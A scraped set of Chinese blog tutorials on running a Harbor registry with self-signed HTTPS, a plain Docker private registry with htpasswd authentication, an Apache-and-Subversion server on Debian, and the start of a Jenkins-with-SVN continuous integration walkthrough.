启动时Harbor默认会监听宿主机的80、443、4443端口，启动Harbor之前必须确保宿主机的80、443、4443端口不被占用，否则Harbor相关组件会启动失败。# 查看Harbor容器的运行状态# docker ps# 或者通过docker-compose查看，此时需要进入Harbor安装脚本所在的目录里执行相关命令# cd /usr/local/harbor# 查看Harbor容器的运行状态# docker-compose ps Name Command State Ports-------------------------------------------------------------------------------------------------------------------------------------harbor-adminserver /harbor/start.sh Up (healthy)harbor-core /harbor/start.sh Up (healthy)harbor-db /entrypoint.sh postgres Up (healthy) 5432/tcpharbor-jobservice /harbor/start.sh Upharbor-log /bin/sh -c /usr/local/bin/ ... Up (healthy) 127.0.0.1:1514-&gt;10514/tcpharbor-portal nginx -g daemon off; Up (healthy) 80/tcpnginx nginx -g daemon off; Up (healthy) 0.0.0.0:443-&gt;443/tcp, 0.0.0.0:4443-&gt;4443/tcp, 0.0.0.0:80-&gt;80/tcpredis docker-entrypoint.sh redis ... Up 6379/tcpregistry /entrypoint.sh /etc/regist ... Up (healthy) 5000/tcpregistryctl /harbor/start.sh Up (healthy)# 启动Harbor容器# docker-compose start# 停止Harbor容器# docker-compose stop# 重启Harbor容器# docker-compose restart# 停止并删除Harbor容器，加上-v参数可以同时移除挂载在容器上的目录# docker-compose down# 创建并启动Harbo容器，参数“-d”表示后台运行命令# docker-compose up -d Harbor测试访问 浏览器输入以下地址或者域名访问Harbor的Web界面，默认账号密码：admin/Harbor12345http://192.168.1.130 将本地镜像Push到Harbor 12345678910111213141516171819202122232425262728293031# 配置Docker客户端允许使用Http协议，如果Nginx更改了的端口映射，需要在以下IP地址后面指定具体的端口号# vim /etc/docker/daemon.json{ "insecure-registries":["192.168.1.130"]}# 重新加载Docker的配置文件# systemctl daemon-reload# 重启Docker# systemctl restart docker# 拉取Docker官方的Centos镜像# docker pull centos:latest# 查看镜像列表# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEcentos latest 1e1148e4cc2c 7 weeks ago 202MB....# 登录Harbor Registry，回车后输入admin用户的帐号信息（admin/Harbor12345）# docker login 192.168.1.130# 如果不使用默认项目名library，则需要使用admin用户提前登录Harbor的Web界面，手动创建新项目后再进行Push操作# 给镜像打上相应的标签, 注意标签格式: ip/{project-name}/{image-name}[:tag]# 项目library只有admin有写的权限# docker tag centos:latest 192.168.1.130/library/centos:1.0# 将本地镜像Push到Harbor# docker push 192.168.1.130/library/centos:1.0 将Harbor镜像Pull到本地 123456789# 删除上面创建的镜像# docker rmi centos# docker rm 192.168.1.130/library/centos:1.0# 将Harbor镜像Pull到本地# docker pull 192.168.1.130/library/centos:1.0# 查看镜像列表# docker ps Harbor安装后更改Nginx的端口映射 1234567891011121314151617181920212223242526272829303132333435# 进入Harbor的安装目录# cd /usr/local/harbor# 停止并删除Harbor容器，加上-v参数可以同时移除挂载在容器上的目录# docker-compose down# 编辑compose的配置文件，修改Nginx的80端口映射# vim docker-compose.yml ports: - 8082:80 - 443:443 - 4443:4443# 编辑Harbor的配置文件，修改hostname加上指定的端口号# vim harbor.cfghostname = 192.168.1.130:8082# 重新生成配置文件# prepare# 创建并启动Harbor容器# docker-compose up -d# 查看Harbor的容器列表，发现Nginx的端口映射已经更改成功# docker-compose psharbor-adminserver /harbor/start.sh Up (health: starting)harbor-core /harbor/start.sh Up (health: starting)harbor-db /entrypoint.sh postgres Up (health: starting) 5432/tcpharbor-jobservice /harbor/start.sh Upharbor-log /bin/sh -c /usr/local/bin/ ... Up (healthy) 127.0.0.1:1514-&gt;10514/tcpharbor-portal nginx -g daemon off; Up (health: starting) 80/tcpnginx nginx -g daemon off; Up (health: starting) 0.0.0.0:443-&gt;443/tcp, 0.0.0.0:4443-&gt;4443/tcp, 0.0.0.0:8082-&gt;80/tcpredis docker-entrypoint.sh redis ... Up 6379/tcpregistry /entrypoint.sh /etc/regist ... Up (health: starting) 5000/tcpregistryctl /harbor/start.sh Up (health: starting) 生成TLS证书，用于Harbor配置Https 12345678910111213141516171819202122232425262728293031323334353637# 下面以IP：192.168.1.130为例子，实际操作中将命令中的IP地址修改为自己的IP地址即可# 创建存放证书的临时目录# mkdir ~/cert# cd ~/cert# 创建自签名根证书# openssl req \\ -newkey rsa:4096 -nodes -sha256 -keyout ca.key \\ -x509 -days 10000 -out ca.crt \\ -subj "/C=CN/ST=Guangdong/L=Shenzhen/O=test_company/OU=IT/CN=test/emailAddress=test@qq.com"# lsca.crt ca.key# 产生证书签名请求# openssl req \\ -newkey rsa:4096 -nodes -sha256 -keyout harbor-registry.key \\ -out harbor-registry.csr \\ -subj "/C=CN/ST=Guangdong/L=Shenzhen/O=test_company/OU=IT/CN=192.168.1.130/emailAddress=test@qq.com"# lsca.crt ca.key harbor-registry.csr harbor-registry.key# 为Registry主机产生证书# echo subjectAltName = IP:192.168.1.130 &gt; extfile.cnf# openssl x509 -req -days 10000 -in harbor-registry.csr -CA ca.crt -CAkey ca.key -CAcreateserial -extfile extfile.cnf -out harbor-registry.crt# lsca.crt ca.key ca.srl extfile.cnf harbor-registry.crt harbor-registry.csr harbor-registry.key# 创建Harbor的证书目录# mkdir -p /opt/cert# 拷贝harbor-registry证书到Harbor的证书目录# cp harbor-registry.crt /opt/cert/# cp harbor-registry.key /opt/cert/ Harbor安装后配置Https 1234567891011121314151617181920212223242526272829# 进入Harbor的安装目录# cd /usr/local/harbor# 停止并删除Harbor容器，加上-v参数可以同时移除挂载在容器上的目录# docker-compose down# 修改harbor.cfg配置文件# vim /usr/local/harbor/harbor.cfgui_url_protocol = httpshostname = 192.168.1.130ssl_cert = /opt/cert/harbor-registry.crtssl_cert_key = /opt/cert/harbor-registry.key# 重新生成配置文件# ./prepare# 让Docker客户端默认使用Https协议访问Registry，需要去掉“insecure-registries”相关配置项# 查看daemon.json文件中是否有"insecure-registries":["192.168.1.130"]，如果有则将其删除掉# vim /etc/docker/daemon.json{"insecure-registries":[""]}# 重新加载Docker的配置文件# systemctl daemon-reload# 重启Docker# systemctl restart docker# 创建并启动Harbor容器# docker-compose up -d 测试通过Https协议访问Harbor 通过浏览器访问这里首先需要将上面产生的~/cert/ca.crt导入到浏览器的受信任的根证书中，然后就可以通过Https协议访问Harbor的Web界面了，但不能保证所有浏览器都支持。访问地址是：https://192.168.1.130 通过Docker命令来访问 123456789101112131415161718192021222324252627# 创建Docker的证书目录，目录名称是IP地址，需要根据自己的情况进行修改# 特别注意，如果Nginx的443端口映射到了其他端口，以下命令中的目录名称都需要带上具体的Https端口号，例如 "mkdir -p /etc/docker/certs.d/192.168.1.130:8443"# mkdir -p /etc/docker/certs.d/192.168.1.130# 将上面产生的ca.crt拷贝到Docker的证书目录下# cp ~/cert/ca.crt /etc/docker/certs.d/192.168.1.130# 重启Docker# systemctl restart docker# 启动Harbor容器# docker-compose up -d# 登录Harbor Registry，回车后输入admin用户的帐号信息（admin/Harbor12345）# docker login 192.168.1.130# 查看镜像列表# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEcentos latest 1e1148e4cc2c 7 weeks ago 202MB....# 给本地镜像打上标签# docker tag centos:latest 192.168.1.130/library/centos:1.0# 将本地镜像Push到Harbor# docker push 192.168.1.130/library/centos:1.0 Harbor的坑 安装Harbor的时候，不要更改数据库默认密码，包括Postgresql、Redis，否则Harbor相关组件很有可能启动失败，导致Web界面显示”502 Gateway”错误 参考博客 搭建Harbor企业级docker仓库 Harbor安装后配置以支持Https var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Docker 之十五 Docker 私有仓库搭建与使用实战",url:"/posts/c76f5f00.html",text:'创建 Docker 私有仓库 12345# 下载Docker官方的registry镜像# docker pull registry# 创建并启动registry容器，添加5000端口映射和数据卷，其中/var/lib/registry目录是registry容器存放Docker镜像的位置# docker run -d -p 5000:5000 --name docker-registry --restart=always -v /container/registry:/var/lib/registry registry 查看私有仓库列表 1234567# 使用命令查看私有仓库列表，默认值为：{"repositories":[]}# curl -X GET http://127.0.0.1:5000/v2/_catalog{"repositories":["clay-tomcat"]}# 使用命令查看指定私有仓库的版本列表，clay-tomcat是私有仓库的名称# curl -X GET http://127.0.0.1:5000/v2/clay-tomcat/tags/list{"name":"clay-tomcat","tags":["1.0"]} Push 本地镜像到私有仓库 1234567891011121314151617# 首先下载Docker官方的Tomcat镜像# docker pull tomcat# 查看镜像列表# docker imagesEPOSITORY TAG IMAGE ID CREATED SIZEtomcat latest 7ee26c09afb3 3 days ago 462MB# 给Tomcat镜像添加一个带有私有仓库IP的TAG，其中7ee26c09afb3是Tomcat镜像的ID，clay-tomcat是私有仓库的名称，1.0是私有仓库中镜像的版本号（默认为latest）# docker tag 7ee26c09afb3 127.0.0.1:5000/clay-tomcat:1.0# 将Tomcat镜像Push到私有仓库# docker push 127.0.0.1:5000/clay-tomcat:1.0# 查看私有仓库列表# curl -X GET http://127.0.0.1:5000/v2/_catalog{"repositories":["clay-tomcat"]} Pull 私有仓库中的镜像到本地 123456789# 首先删除上面创建的TAG镜像与Docker官方的Tomcat镜像，因为本地不存在对应镜像层时Docker才会从私有仓库下载镜像# docker rmi tomcat# docker rmi 127.0.0.1:5000/clay-tomcat:1.0# 将私有仓库中的镜像Pull到本地，clay-tomcat是私有仓库的名称，1.0是私有仓库中镜像的版本号（默认为latest）# docker pull 127.0.0.1:5000/clay-tomcat:1.0# 使用刚Pull下来的Tomcat镜像，创建并启动Tomcat容器，可以通过浏览器测试访问Tomcat页面：http://127.0.0.1:8080/# docker run -d --name tomcat -p 8080:8080 127.0.0.1:5000/clay-tomcat:1.0 删除私有仓库中的镜像 Docker 官方不建议直接删除镜像的镜像层数据，所以没有接口直接删除镜像；删除镜像会很麻烦，一般如果删除某镜像只需删除该镜像的元数据，也就是 curl 命令查看到的镜像信息，而对于该镜像的镜像层数据需要进行垃圾回收才会真的被删除。如果删除的镜像与未删除的镜像公用了一些镜像层数据，垃圾回收之后再也用不了这些镜像了，因此删除元数据就好。 1234567891011121314151617# 官方推荐使用digest_hash参数删除私有仓库中的镜像数据，具体教程请自行网上搜索。# 连接Registry容器，docker-registry是容器名称，也可以使用容器ID# docker exec -it docker-registry /bin/sh# 删除对应镜像的所有版本，其中clay-tomcat是镜像名称# rm -rf /var/lib/registry/docker/registry/v2/repositories/clay-tomcat# 执行垃圾回收操作，注意2.4版本以上的registry才有此功能# docker exec registry bin/registry garbage-collect /etc/docker/registry/config.yml# 删除后需要重启Registry容器# docker restart docker-registry# 查看私有仓库列表# curl -X GET http://127.0.0.1:5000/v2/_catalog{"repositories":[]} 访问远程私有仓库 访问远程私有仓库之前，必须确认远程私有仓库所在服务器的防火墙开放了 Registry 端口（例如 5000）。 123456789101112131415161718192021222324# 查看远程私有仓库列表# curl -X GET http://192.168.1.130:5000/v2/_catalog# 由于Docker Registry默认采用Http协议，而Docker本地客户端默认需要使用Https协议执行Pull操作，因此如果Docker本地客户端直接从远程私有仓库中Pull镜像会提示以下错误信息Error response from daemon: Get https://192.168.1.130:5000/v2/: http: server gave HTTP response to HTTPS client# 配置Docker本地客户端允许使用Http协议，其中192.168.1.130:5000是远程私有仓库的IP和端口，配置内容必须符合JSON格式# vim /etc/docker/daemon.json{ "insecure-registries":["192.168.1.130:5000"]}# 重启Docker服务，使用配置生效# systemctl daemon-reload# systemctl restart docker# 从远程私有仓库Pull镜像到本地# docker pull 192.168.1.130:5000/clay-tomcat:1.0# 将本地镜像Push到远程私有仓库# docker pull hello-world# docker tag fce289e99eb9 192.168.1.130:5000/hello-world：1.0# docker push 192.168.1.130:5000/hello-world：1.0# curl -X GET http://192.168.1.130:5000/v2/_catalog 创建带身份验证的 Docker 私有仓库 12345678910111213141516171819202122232425262728293031# 下载Docker官方的registry镜像# docker pull registry# 创建保存私有仓库帐号信息的目录# mkdir -p /etc/docker/registry-auth# 为clay用户名生成一条密码为123456的用户信息，并保存在文件/etc/docker/registry-auth/htpasswd，其中registry:latest表示使用registry镜像的latest版本# docker run --entrypoint htpasswd registry:latest -Bbn clay 123456 &gt;&gt; /etc/docker/registry-auth/htpasswd# 用户密码默认会加密保存到本地磁盘# cat /etc/docker/registry-auth/htpasswdclay:$2y$05$nkzz4O9BARoZb8O61WHmLelm29GI/qOv3gUKimy5aTtDvm1tmg30e# 创建并启动带身份验证的registry容器，添加5000端口映射和数据卷，其中/var/lib/registry目录是registry容器存放Docker镜像的位置# 这里必须通过数据卷将宿主机保存私有仓库帐号信息的目录/etc/docker/registry-auth挂载到registry容器内的目录/auth，然后Docker验证用户身份时会在容器内找"REGISTRY_AUTH_HTPASSWD_PATH"指向的文件# docker run -p 5000:5000 --restart always --name docker-registry \\ -v /container/registry:/var/lib/registry \\ -v /etc/docker/registry-auth:/auth \\ -e "REGISTRY_AUTH=htpasswd" \\ -e "REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm" \\ -e REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd \\ -d registry# 登录私有仓库，成功后帐号信息默认存放在~/.docker/config.json# docker login --username=clay 127.0.0.1:5000# 查看私有仓库列表，此时通过cul命令访问带身份验证的私有仓库，必须指定用户名/密码# curl -X GET -u clay:123456 http://127.0.0.1:5000/v2/_catalog# 执行"docker login"操作之后，就可以往私有仓库Push或者Pull镜像了# docker pull 127.0.0.1:5000/clay-tomcat:1.0 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Debian 安装 Apache 与 Subversion",url:"/posts/1b3fbf25.html",text:'前言 通过 Apache、Subversion 搭建 SVN 服务器，实现使用 HTTP、SVN 协议访问 SVN 仓库，并进行细粒度的权限控制，本教程适用于 Debian/Ubuntu 系统。 系统环境 12345678# uname -a# Linux debian 3.10.0-957.1.3.el7.x86_64 #1 SMP Thu Nov 29 14:49:43 UTC 2018 x86_64 GNU/Linux# cat /etc/os-releasePRETTY_NAME="Debian GNU/Linux 9 (stretch)"NAME="Debian GNU/Linux"VERSION_ID="9"VERSION="9 (stretch)" 安装软件 1234567891011# 更新软件索引# apt-get update# 安装apache# apt-get install -y apache2 apache2-utils# 安装subversion，适用于debian# apt-get install -y subversion subversion-tools libapache2-mod-svn# 安装subversion，适用于ubuntu# apt-get install -y subversion subversion-tools libapache2-mod-svn libapache2-svn 验证 Apache 是否安装成功 123456789101112131415161718192021222324252627282930313233343536# 启动apache服务# service apache2 start# 或者执行# /etc/init.d/apache2 start# 查看apache是否占用80端口# netstat -anp|grep 80# 查看防火墙状态# ufw status# 如果开启了防火墙，则开放80端口# ufw allow 80/tcp# 保存防火墙配置# ufw reload# 浏览器输入以下地址访问apache服务，如果访问正常则说明apache安装并启动成功http://127.0.0.1# 服务管理命令# 关闭：service apache2 stop# 启动：service apache2 start# 重启：service apache2 restart# 查看状态：service apache2 status# 前台方式启动：apachectl -D FOREGROUND# 取消自启动：update-rc.d apache2 remove# 开机自启动：update-rc.d apache2 defaults# 相关目录文件说明：# 安装目录：/usr/lib/apache2# 启动脚本路径：/etc/init.d/apache2# 配置文件目录：/etc/apache2# 主配置文件：/etc/apache2/apache2.conf# 端口配置文件：/etc/apache2/ports.conf 创建 SVN 仓库，并配置 Apache 的访问权限 12345678910111213141516171819202122232425262728293031# 创建存放所有SVN仓库的目录# mkdir /var/lib/svn# 创建SVN仓库jenkins-repo# svnadmin create /var/lib/svn/jenkins-repo# 将SVN仓库的读写权限授给apache用户# chown -R www-data:www-data /var/lib/svn/jenkins-repo# 配置apache的svn模块，在对应配置文件的末尾追加以下内容# 这里相当于配置与Apache登录相关的内容（例如登录密码验证），只有dav_svn.passwd指定的用户才有权限访问所有仓库，下面会详细介绍相关配置# vim /etc/apache2/mods-enabled/dav_svn.conf&lt;Location /svn&gt; DAV svn SVNParentPath /var/lib/svn AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/dav_svn.passwd Require valid-user&lt;/Location&gt;# 创建Apache用户的密码文件，将jenkins替换为你自己指定的用户名，回车执行之后输入密码即可# 注意这里的用户密码和Subversion仓库本身的身份校验机制（authz）没有任何关系，只用于Apache登录校验# htpasswd -cm /etc/apache2/dav_svn.passwd jenkins# 修改用户密码文件的权限# chgrp www-data /etc/apache2/dav_svn.passwd# chmod 660 /etc/apache2/dav_svn.passwd# 重启apache服务# service apache2 restart mod_dav_svn 模块的其他配置介绍（如果嫌麻烦可忽略） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# 配置文件路径：/etc/apache2/mods-enabled/dav_svn.conf# 下面配置中的"SVNParentPath /var/lib/svn"表示/var/lib/svn目录下的每个子目录都是一个仓库（即所有仓库的根目录），同时表示&lt;Location&gt;标签内的任何权限配置都被所有仓库共用；&lt;Location&gt;标签内的/svn，指通过HTTP协议访问时的URL路由&lt;Location /svn&gt; DAV svn SVNParentPath /var/lib/svn AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/dav_svn.passwd Require valid-user&lt;/Location&gt;# 如果想要指定多个仓库，让每个仓库都拥有不同的访问权限配置，那么可以使用多个Location标签，同时需要将标签内的“SVNParentPath”替换为“SVNPath”，并指向具体仓库的目录&lt;Location /svn/jenkins-repo&gt; DAV svn SVNPath /var/lib/svn/jenkins-repo AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/jenkins_repo.passwd Require valid-user&lt;/Location&gt;&lt;Location /svn/python-repo&gt; DAV svn SVNPath /var/lib/svn/python-repo AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/python-repo.passwd Require valid-user&lt;/Location&gt;# 如果替换上述"Require valid-user"为"Require user tony robert"，那么只有tony和robert用户可以访问所有仓库&lt;Location /svn&gt; DAV svn SVNParentPath /var/lib/svn AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/dav_svn.passwd Require user tony robert&lt;/Location&gt;# 通过使用&lt;LimitExcept&gt;标签，允许匿名读取所有仓库，而只有认证用户才能对所有仓库进行写操作&lt;Location /svn&gt; DAV svn SVNParentPath /var/lib/svn AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/dav_svn.passwd &lt;LimitExcept GET PROPFIND OPTIONS REPORT&gt; Require valid-user &lt;/LimitExcept&gt;&lt;/Location&gt; 验证 HTTP SVN 是否可用 12345678910111213141516171819202122232425262728293031# 浏览器输入以下地址来访问SVN仓库，其中/svn是&lt;Location&gt;标签内的值，而jenkins-repo是上面创建的SVN仓库，访问之后页面会提示你输入用户名和密码http://127.0.0.1/svn/jenkins-repo/# 配置SVN客户端允许以明文方式保存密码到本地磁盘，首次使用svn客户端的情况下可能不存在servers配置文件，此时可忽略配置$ vim ~/.subversion/servers[global]store-plaintext-passwords = yes# 检出SVN仓库jenkins-repo，指定使用jenkins用户进行登录，其中/svn是&lt;Location&gt;标签内的值，而jenkins-repo是上面创建的SVN仓库，回车之后会提示你输入密码$ svn checkout --username jenkins http://127.0.0.1/svn/jenkins-repo/# 进入刚检出的仓库目录$ cd jenkins-repo# 创建文件$ touch api.version# 将指定文件纳入SVN版本控制$ svn add api.version# 将指定文件提交到SVN仓库$ svn commit -m "add file" api.version# 显示工作区中目录与文件的状态，如果上述步骤都成功执行，执行该命令后则不会有任何日志信息输出$ svn status# 可以使用以下命令查询svn命令具体的使用方法$ svn --help$ svn commit --help# 至此，通过Apache、Subversion搭建SVN服务器（HTTP）的步骤算是基本完成了，下面将介绍使用Apache的mod_authz_svn模块对仓库目录进行更细粒度的权限控制，如果不需要细粒度的权限控制，则不用继续往下阅读了。 通过 mod_authz_svn 模块对仓库目录的访问进行细粒度权限控制 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# 进入对应SVN仓库的目录# cd /var/lib/svn/jenkins-repo# 每个SVN仓库目录下都有对应的身份校验文件（authz、passwd），由SVN自动创建# tree confconf|-- authz|-- hooks-env.tmpl|-- passwd`-- svnserve.conf# 添加SVN仓库的用户帐号，注意这里的用户名/密码，需要和访问Apache的用户名/密码一致# 即用户名/密码需要和"AuthUserFile /etc/apache2/dav_svn.passwd"指定的帐号信息一致# vim conf/passwd[users]jenkins = 123456# 配置SVN仓库的用户组、读写权限# vim conf/authz[groups]team = jenkins[/]@team = rw# 编辑SVN仓库的配置文件，对应内容修改如下，其中“anon-access”项的值必须为none# vim conf/svnserve.conf[general]anon-access = noneauth-access = writepassword-db = passwdauthz-db = authz# 配置authz功能，其中AuthzSVNAccessFile指向的是SVN仓库的authz策略文件，多个SVN仓库可以使用多个&lt;Location&gt;标签进行配置，注意这里使用的是“SVNPath”，而不是"SVNParentPath"# vim /etc/apache2/mods-enabled/dav_svn.conf&lt;Location /svn/jenkins-repo&gt; DAV svn SVNPath /var/lib/svn/jenkins-repo AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/jenkins_repo.passwd AuthzSVNAccessFile /var/lib/svn/jenkins-repo/conf/authz Require valid-user&lt;/Location&gt;# 如果使用”SVNParentPath“代替”SVNPath“来指定多个仓库的父目录时，那么所有仓库都将按照指定的策略文件来管理读写权限；此时如果要对具体每个仓库分别配置不同读写权限，authz文件内需要使用如下的语法进行配置：&lt;Location /svn&gt; DAV svn SVNParentPath /var/lib/svn AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/dav_svn.passwd AuthzSVNAccessFile /etc/svn/svn_authz Require valid-user&lt;/Location&gt;# vim /etc/svn/svn_authz[groups]project1_committers = paulex richardproject2_committers = jimmy michel[repos1:/]@ project1_committer = rw[repos2:/]@ project2_committer = rw# 重启apache服务# service apache2 restart 启动 Subversion 服务 1234567891011121314151617181920# 默认情况下，通过Apache、Subversion搭建SVN服务器，如果只需要通过HTTP协议访问SVN仓库，则无需启动Subversion服务，相反如果想通过SVN协议直接访问SVN仓库则需要启动# 其中/var/lib/svn是所有SVN仓库的父目录，如果直接使用SVN协议，那么SVN仓库的用户登录与读写权限控制默认是通过每个仓库下的passwd、authz、svnserve.conf配置文件分别进行控制，此时与Apache没有任何关系# 参数 -d 表示后台运行，否则默认前台运行# svnserve -d -r /var/lib/svn# 测试SVN客户端使用SVN协议检出仓库jenkins-repo，指定使用jenkins用户进行登录，其中3690是Subversion服务的默认端口# svn checkout --username jenkins svn://127.0.0.1:3690/jenkins-repo# 查看防火墙状态# ufw status# 如果开启了防火墙，则开放3690端口# ufw allow 3690/tcp# 保存防火墙配置# ufw reload# 关于Subversion服务开机自启动的两种方式：# 方式一：使用第三方工具Supervistor实现Subversion开机自启动# 方式二：将配置Subversion配置成系统服务，由systemctl管理开机自启动 Dockerfile 里配置容器启动时默认启动 Apache 与 Subversion 1234567RUN echo "svnserve -d -r /var/lib/svn" &gt; /usr/local/start-servers.shRUN echo "apachectl -D FOREGROUND" &gt;&gt; /usr/local/start-servers.shRUN chmod +x /usr/local/start-servers.shCMD /bin/bash /usr/local/start-servers.sh# 以后创建并以后台方式启动容器时，Apache与Subversion服务会默认自启动# docker run -d -p 9126:80 -p 4690:3690 ... Centos7 安装 Apache&amp;Subversion How to Setup an Apache Subversion (SVN) Server on CentOS 7 The Ultimate Guide to Setting Up Apache Subversion SVN and TortoiseSVN For Version Control 本文引用 Install Apache SVN (Subversion) on Debian 9 / Ubuntu 16.04 使用 Apache 和 Subversion 搭建安全的版本控制环境（Http、Https、MySQL 存储 Apache 用户信息） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"debian"},{title:"Jenkins 入门教程之三 Jenkins 与 SVN 持续集成实战",url:"/posts/bd0f3a17.html",text:'上篇：Jenkins 入门教程之二 Jenkins 与 SVN 搭建 CI-CD 环境 下面的实战内容是在上篇内容的基础上进行操作的，为了保证连贯性，建议先将上篇的操作步骤执行完再阅读本篇内容。 通过 Eclipse 创建基于 Maven 的 SpringBoot Web 项目，用于测试 Maven 构建项目 创建 Maven 项目的时候，Archetype 选择”maven-archetype-quickstart”，此 SpringBoot Web 项目不需要 web.xml，只需在 pom.xml 配置文件里指定 packaging 为 war 类型即可。项目内容很简单，访问 JSP 页面直接输出字符串 “hello Jim”。项目源码下载链接已经给出，下载解压后直接导入项目到 Eclipse，执行”spring-boot:run” 命令即可运行项目，浏览器输入以下地址验证是否运行正常：http://127.0.0.1:8080/demo/hello，点击下载完整的代码 、点击下载 SHA256 校验文件。 在 Eclipse 里创建 SVN 资源库，并将 SpringBoot Web 项目的源码提交 SVN 资源库 这里的 SVN 资源库是上一篇教程里创建的 Subversion 仓库 jenkins-repo，访问的用户名是 jenkins，密码是 123456；因为宿主机与 Docker 容器（SVN）配置了端口映射，因此 Eclipse 里可以直接使用以下 URL 访问对应的 SVN 仓库： http://127.0.0.1:9126/svn/jenkins-repo 将 jenkins-study 项目的源码提交到 SVN 资源库后的目录结构 Jenkins 创建任务 选择 “构建自有风格的软件项目” 找到 “Source Code Management”，选择 “Subversion”，点击”Add” 按钮，添加访问 SVN 仓库 jenkins-repo 的用户名和密码 在 “Source Code Management” 中继续填写 jenkins-study 项目所在 SVN 仓库 jenkins-repo 完整的 URL 地址，选择上面添加的 SVN 仓库用户名和密码；构建类型选择 “Invoke top-level Maven targets”，而 Maven 版本则选择之前在 “全局工具配置” 中指定的 Maven 版本，构建命令填 “clean install”，最后保存设置内容。特别注意，如果这里的 URL 地址使用 SVN 协议，那 Jenkins 将会提示无效 URL 的错误信息，因此需要使用 HTTP 协议来访问 SVN 仓库，同时完整的 URL 地址必须包含 Maven 项目的名称，因为 Jenkins 默认会去找 URL 地址下的 pom.xml 文件。使用 HTTP 协议访问的前提是 Subversion 集成了 Web 服务，具体教程在这里，通过 Apache、Subversion 搭建 SVN 服务器，实现使用 HTTP/SVN 协议访问 SVN 仓库 12345678# 因为SVN服务安装在Docker容器内（基于Debian镜像），Jenkins同样也安装在Docker容器内（基于Tomcat镜像），因此下图URL中的IP是SVN服务所在Docker容器的IP。因为之前在Docker容器内安装Subversion并集成了Apache，而Apache默认端口是80，所以下图的URL地址可以不指定具体的端口。# 获取SVN服务所在Docker容器的IP地址# docker exec -it svn-httpd ip addr111: eth0@if112: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever 手动对之前的 jenkins-study 项目执行构建操作 构建过程中，Jenkins 默认会从 SVN 仓库检出对应的项目源码到 ～/.jenkins/workspace 目录（Jenkins 所在服务器的文件目录），同时在 Jenkins 构建任务页面左边的小窗口内可以看到相关构建信息（构建进度、日志等）。第一次构建过程耗时会比较长，因为 Maven 需要从中央仓库下载很多依赖包；如果想加快构建速度，局域网内可以通过 Nexus 搭建 Maven 本地仓库，然后在 Maven 的配置文件 settings.xml 中添加本地仓库的地址。 配置构建完成后将 War 包部署到 Tomcat 应用服务器 这里的 Tomcat 应用服务器，一般指测试服务器或者生产服务器。由于 Jenkins 需要将 War 部署到 Tomcat 服务器上，因此这里的 Tomcat 服务器需要预先需要配置管理员用户。先找到”Post-build Actions” 配置项，选择”Add post-build action” –&gt; “Deploy war/ear to a container（依赖 deploy to container 插件）”，然后填写 War 包文件的相对路径、访问 Tomcat 项目时使用的项目名称。接着选择”Add Container” –&gt; “Tomcat 8.x”，点击 “Add” 按钮，填写 Tomcat 服务器管理员用户的用户名和密码、访问 Tomcat 服务器的 URL 地址，然后点击 “Save” 按钮保存设置。最后再次执行构建操作，构建完成后可以查看构建日志或者在浏览器输入以下地址，验证构建生成的 War 包文件是否成功部署到指定的 Tomcat 服务器上，浏览器可以访问 URL：http://127.0.0.1:8082/jenkins-study/demo/hello 配置远程触发构建 找到”Build Triggers” 配置项，勾选”Trigger builds remotely”，填写 Token 的值（任意字符串），最后点击”Save” 按钮保存设置。通过浏览器或者 CURL 工具访问链接 http://127.0.0.1:8888/jenkins/job/jenkins-study/build?token=yOEBc7Dcd4duKSNt ，测试远程触发构建是否配置成功；其中 http://127.0.0.1:8888/jenkines 是访问 Jenkins 服务器的 URL 地址。构建成功后，在 